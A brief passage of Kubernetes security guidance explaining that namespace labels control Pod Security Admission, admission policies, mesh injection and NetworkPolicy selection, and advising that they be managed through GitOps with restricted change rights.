Namespace labels
Labels on the namespace drive a lot of security: Pod Security Admission levels (pod-security.kubernetes.io/enforce), which admission policies apply, mesh injection, NetworkPolicy namespaceSelectors and cost or team ownership.
Treat them as configuration: set them from GitOps, and restrict who can change them, since changing a label can switch a control off.
